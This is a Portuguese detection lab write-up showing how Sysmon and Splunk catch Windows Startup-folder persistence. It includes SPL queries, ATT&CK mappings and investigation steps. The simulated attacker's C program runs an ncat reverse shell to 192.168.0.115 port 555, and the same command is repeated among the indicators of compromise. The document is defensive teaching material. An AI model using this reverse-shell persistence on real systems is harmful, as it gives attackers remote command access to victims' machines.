# Lab 03 - Persistência via Startup Folder
## Objetivo
Detectar uma tentativa de persistência via Startup Folders em ambiente Windows, utilizando Sysmon como gerador de eventos e Splunk como SIEM.

## Cenário Geral
Um atacante obteve acesso inicial ao host e executa tentativas de estabelecer persistência. Para isto, ele faz upload do *ncat.exe* em *C:\Users\vboxusers\Downloads* e cria um executável de persistência no sistema para iniciar o *ncat.exe* conectando o prompt de comando do sistema ao atacante remoto a cada login do usuário **VboxUser**. 
<br>
Após acesso inicial, o atacante fez upload do seguinte executável escrito em C :
```C
#include <stdlib.h>

int main(){
        system("C:\\Users\\vboxuser\\Downloads\\ncat.exe 192.168.0.115 555 -e C:\\Windows\\System32\\cmd.exe");
        return 0;
}
```
que executa `ncat.exe 192.168.0.115 555 -e C:\\Windows\\System32\\cmd.exe`, para a pasta *"C:\Users\vboxuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"*. Pasta esta amplamente conhecida e utilizada por fazer com que todos os executáveis contidos nela sejam executados assim que o usuário faz logon no sistema.
## Telemetria Gerada
### Primeiro Método de Detecção: Sysmon Event ID 11
Criar um arquivo executável de persistência dispara o evento "**File Creation**" de ID 11 do Sysmon. Buscar por eventos de "**File Creation**" relacionados à pasta "Startup" trouxe logo um resultado suspeito:<br>
<img width="1037" height="460" alt="image" src="https://github.com/user-attachments/assets/7704da8d-b089-43ec-bbae-1c2aed2d2157" /><br>
mostrando um arquivo executável chamado "*persistence.exe*" localizado no diretório de Startup.
### Segundo Método de Detecção: Sysmon Event ID 1
Outra forma de detecção é checar se algum processo foi iniciado por um executável dentro do diretório de Startup. Para isto, basta buscar por eventos de "**Process Creation**" relacionados à pasta "Startup", como feito na imagem:<br>
<img width="1069" height="578" alt="image" src="https://github.com/user-attachments/assets/a7113e36-78ae-4712-96d8-708a930ebde6" />
<br>
Neste resultado existem diversos eventos listados, mas um dos primeiros logo se revela nosso comportamento suspeito procurado:<br>
<img width="986" height="301" alt="image" src="https://github.com/user-attachments/assets/6fbde2e3-4abd-4ad9-8aae-6214a06753f1" />
<br><br>
A primeira forma de detecção revela apenas criações de arquivos de persistência, enquanto a segunda foca em detectar as execuções destes arquivos maliciosos. Ambas são complementares para detectar o início e a continuidade de acessos remotos não autorizados ao sistema.
## Investigação
### Quem Criou?
Analisando o evento obtido pelo primeiro método de detecção vê-se que o usuário utilizado para criar o arquivo de persistência foi "*vboxuser*":<br><img width="353" height="73" alt="image" src="https://github.com/user-attachments/assets/ba72ac7e-ad52-4ebd-b178-821d1f33c6c0" />
<br>
O que indica a possibilidade de comprometimento da conta pelo atacante.
### Quando Criou?
O mesmo evento também mostra o horário e data de criação do arquivo:<br>
<img width="556" height="133" alt="image" src="https://github.com/user-attachments/assets/94db1040-499a-4ab0-9f59-74c189ba5768" />
<br>
No dia 06/07/2026 às 18:18. Ainda no evento, vamos checar a imagem do processo que o originou:<br>
<img width="241" height="81" alt="image" src="https://github.com/user-attachments/assets/4f578c8f-400c-4ad0-b960-e7ac1921fac0" /><br>
Agora sabemos que o arquivo de persistência foi criado pelo "curl", o que é um forte indício de que persistence.exe foi baixado de um servidor HTTP remoto. Investigar a fundo a origem do executável pode nos levar mais perto da identificação do atacante.

### Qual Payload Será Executado?
A query do segundo método de detecção exibe uma variedade de processos criados com um intervalo de minúsculo de tempo na casa dos milisegundos, o que muito provavelmente relaciona os eventos em algum tipo de causalidade.<br>
<img width="1062" height="579" alt="image" src="https://github.com/user-attachments/assets/eeb4b4f7-46e0-4603-a431-e5fb06d6291e" />
Primeito vê-se a execução do "persistence.exe", poucos milisegundos depois acontece a execução do "cmd.exe" com a seguinte command line:<br>
<img width="1007" height="104" alt="image" src="https://github.com/user-attachments/assets/7e22a7bd-dd37-4cd4-a525-28da9b632089" /><br>
Mostrando a execução do netcat.exe para estabelecer conexão com o host "*192.168.0.115*" na porta 555, dando acesso remoto ao cmd do sistema como um claro reverse shell. Esta execução é confirmada pelo evento posterior do próprio netcat.
### Quando Será Executado?
Pela presença do executável de persistência na pasta de Startup do usuário "vboxuser" (*C:\Users\vboxuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup*), sabemos que ele será iniciado a cada logon deste usuário.
## Oportunidades de Detecção
* Criação do arquivo "persistence.exe" no diretório "*C:\Users\vboxuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup*"
* Início do proccesso no diretório "*C:\Users\vboxuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup*".
* Execução do netcat a partir do diretório de Startup.
* Conexão estabelecida com o host desconhecido *192.168.0.115* na porta incomum *555* a partir do netcat.
## Indicadores de Compromisso (IOCs)
* IP do invasor: 192.168.0.115
* Conta comprometida: vboxuser
* Arquivo suspeito: C:\Users\vboxuser\Downloads\ncat.exe
* Arquivo executável de persistência: C:\Users\vboxuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\persistence.exe
* Script de persistência:
  ```Powershell
  C:\Users\vboxuser\Downloads\ncat.exe 192.168.0.115 555 -e C:\Windows\System32\cmd.exe
  ```
## Queries SPL Utilizadas
* Encontrar criação de arquivos em diretórios de startup:
  ```SPL
  index=main EventID="11" Startup
  ```
* Encontrar início de processos em diretórios de startup:
  ```SPL
  index=main EventID="1" | where like(Image, "%Startup%")
  ```
## ATT&CK
* T1547: Boot or Logon Autostart Execution
* * 001: Registry Run Keys / Startup Folder
* T1219: Remote Access Tools
## Falsos Positivos
Algumas aplicações legítimas criam arquivos executáveis em diretórios de Startup para inicialização automática de seus serviços ou programas de atualização de software.
## Conclusão
O Sysmon e o Splunk são duas ótimas ferramentas para abstrair, em poucos logs, o evento de criação de arquivos em Startup Folders. Com eles podemos traçar o momento de criação, o payload e a frequência de execução, possibilitando ações posteriores de threat hunting e incident response ao ataque.
